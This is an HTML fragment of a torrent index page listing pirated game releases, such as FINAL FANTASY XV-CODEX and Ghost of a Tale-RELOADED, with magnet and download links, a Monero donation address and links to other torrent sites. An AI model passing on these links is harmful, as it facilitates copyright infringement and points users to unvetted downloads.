<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>5</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/tunnels-of-despair-plaza-t272091.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/tunnels-of-despair-plaza-t272091.html" "><b>Tunnels of Despair-PLAZA</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/tunnels-of-despair-plaza-t272091.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:557364816F39CA7DDA1A6366CE5B32D67FCF6CBD&dn=Tunnels of Despair-PLAZA&xl=1656394035&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://mgtracker.org:6969&tr=udp://public.popcorn-tracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/tunnels-of-despair-plaza-t272091/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:08:52">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>1.54 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>32</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>10</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/suna-plaza-t272201.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/suna-plaza-t272201.html" "><b>Suna-PLAZA</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/suna-plaza-t272201.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:8EF45D5CF3EBDCC01D8CEAFF07658E013AAABC34&dn=Suna-PLAZA&xl=1849626861&tr=udp://eddie4.nl:6969&tr=udp://9.rarbg.to:2710&tr=udp://p4p.arenabg.ch:1337&tr=udp://p4p.arenabg.com:1337&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://public.popcorn-tracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://tracker.opentrackr.org:1337&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://mgtracker.org:6969&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/suna-plaza-t272201/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 11:34:12">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>1.72 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>9</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>6</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/slay-the-spire-patch-16-t271519.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/slay-the-spire-patch-16-t271519.html" "><b>Slay the Spire Patch 16</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/slay-the-spire-patch-16-t271519.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:935FB371027744D22BDDE2C3D916F789713DF308&dn=Slay the Spire Patch 16&xl=387148506&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://9.rarbg.to:2710&tr=udp://p4p.arenabg.com:1337&tr=udp://tracker.opentrackr.org:1337&tr=http://tracker.mg64.net:6881/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/slay-the-spire-patch-16-t271519/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 17:07:15">6 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>369.21 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>47</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>11</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/terratech-v0-7-9-1-t272119.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/terratech-v0-7-9-1-t272119.html" "><b>TerraTech v0.7.9.1</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/terratech-v0-7-9-1-t272119.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:9430F741C4B1C7B8EADC8BEB3D227486BE853D53&dn=TerraTech v0.7.9.1&xl=301667515&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://9.rarbg.to:2710&tr=udp://tracker.opentrackr.org:1337&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=udp://asnet.pw:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://p4p.arenabg.ch:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/terratech-v0-7-9-1-t272119/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:11:48">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>287.69 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>7</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/final-fantasy-xv-codex-t272149.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/final-fantasy-xv-codex-t272149.html" "><b>FINAL FANTASY XV-CODEX</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/final-fantasy-xv-codex-t272149.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:26925104FF7C0077358BD46B194C2E46FEA0EC01&dn=FINAL FANTASY XV-CODEX&xl=82865559653&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://p4p.arenabg.ch:1337&tr=http://tracker.mg64.net:6881/announce&tr=udp://9.rarbg.to:2710&tr=http://mgtracker.org:2710/announce&tr=udp://mgtracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/final-fantasy-xv-codex-t272149/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:14:38">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>77.17 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>115</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>787</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/ghost-of-a-tale-reloaded-t272144.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/ghost-of-a-tale-reloaded-t272144.html" "><b>Ghost of a Tale-RELOADED</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/ghost-of-a-tale-reloaded-t272144.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:50BA3F307103B8B051FC1E3AF14856EF64454749&dn=Ghost of a Tale-RELOADED&xl=3123318974&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://tracker1.itzmx.com:8080/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/ghost-of-a-tale-reloaded-t272144/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:14:19">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>2.91 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>94</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>8</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/the-council-episode-1-codex-t272139.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/the-council-episode-1-codex-t272139.html" "><b>The Council Episode 1-CODEX</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/the-council-episode-1-codex-t272139.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:93DA86C3A81ED4640886B636E950A360E2CB5803&dn=The Council Episode 1-CODEX&xl=5915088963&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=udp://public.popcorn-tracker.org:6969&tr=http://tracker1.itzmx.com:8080/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce&tr=udp://mgtracker.org:6969&tr=udp://p4p.arenabg.ch:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/the-council-episode-1-codex-t272139/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:14:01">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>5.51 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>84</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>56</font></b></td>
</tr>
</table>
</td></tr></table><br /><br /><br />
</div> 
<div id="maia-signature"></div>
<table class="bottom" width="100%" height="25px" style="border-top: 1px solid #E5E5E5;">
<tr align="center" valign="top">
<td>
<div id="footer">
<ul>
<li><span><a href='https://getmonero.org/'>Monero (XMR)</a>: 43WJty1KKLTQ6qAkvB4Zcm5FZJ2BsfaaEagp5BB7tVYuC7cf2S1Jn6pF9Baamn4ZGrTPrmeePDYZLDxbsqGSBFmmCZaXDpm</span></li>
</ul>
<br />
<ul>
<li><span title="[ Uso de memória: 0.45 ] - [ Tempo de Execução: 2.078s ] - [ GZIP: ligado ]" style="font-size:1em;">© 2014-2018 Pirateiro, Inc.</span></li>
<li><span><a href="/contato/">contact</a></span></li>
<li><span><a href="/blog/">blog</a></span></li>
<li><span><a href="/api/">api</a></span></li>
<li><span><a href="/rss.xml">rss</a></span></li>
<li><span><a href="/entrar/">login</a></span></li>
<li><span><a href="/registrar/">signup</a></span></li>
</ul>
<br />
<ul>
<li><span title="friends" style="font-size:1em;">Sites Recommended:</span></li>
<li><span><a rel="nofollow" target="_blank" href="https://torrentz2.eu">Torrentz2</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://www.torrentpond.com/">TorrentPond</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://torrentz6.eu">Torrentz6</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://torrents.me">Torrents</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://magnet4you.me/">Magnet4You</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://soparagamestorrents.com/">SoParaGamesTorrents</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://bt-scene.cc/">BitTorrentScene</a></span></li>
</ul>
<ul>
<li><span><a rel="nofollow" target="_blank" href="http://torrentkit.com">TorrentKit</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://theporndude.com/">ThePornDude</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://animekaizoku.com">AnimeKaizoku</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://baixarblurays.com/">BaixarBlurays</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://torrent4you.me">Torrent4You</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="https://freeallmovie.com">FreeAllMovie</a></span></li>
</ul>
<ul>
<li><span><a rel="nofollow" target="_blank" href="https://unblocked.bid/">Unblocked</a></span></li>
<li><span><a rel="nofollow" target="_blank" href="http://xgamesdownloads.com/">XGamesDownloads</a></span></li>
</ul>
</div>
</td>
</tr>
</table>
<br /></div></main> <div class="_br9is">
<div class="_nl1vc _c3por">
<div class="_h7ogh"></div>
<div class="_hcq2b"></div>
</div>
<div class="_b1dus">
<div class="_51usa">
<div class="_mghjk">
<div class="_o9pt1">
<a class="logo" href="/registrar" title="Pirateiro" style="width: 40px;height: 32px;display: block;margin:-3px 15px;">
<span></span>
</a>
<span class="_odfsi" style="font-size: larger;"><b>Maximize your experience and don't see ads.</b></span>
<a class="registrar" href="/registrar" style="margin-left: 30px;">signup</a>
</div>
</div>
</div>
</div>
<span class="_8yoiv"><a onclick="$('._br9is').slideToggle();" style="text-decoration: none;">✕</a></span>
</div>
<div style="float: left;">
<a href="#to_the_top" class="top-arrow"></a>
</div>
<script src="/js/slideout.min.js"></script>
<script>
      var slideout = new Slideout({
        'panel': document.getElementById('main'),
        'menu': document.getElementById('menu'),
        'padding': 256,
        'tolerance': 70
      });
      
      document.querySelector('.js-slideout-toggle').addEventListener('click', function() {
        slideout.toggle();
      });
      
      document.querySelector('.menu').addEventListener('click', function(eve) {
        if (eve.target.nodeName === 'A') { slideout.close(); }
      });
      /*
      slideout.on('beforeopen', function() {
        document.querySelector('.fixed').classList.add('fixed-open');
      });
      
      slideout.on('beforeclose', function() {
        document.querySelector('.fixed').classList.remove('fixed-open');
      });
      */
    </script>
</body></html>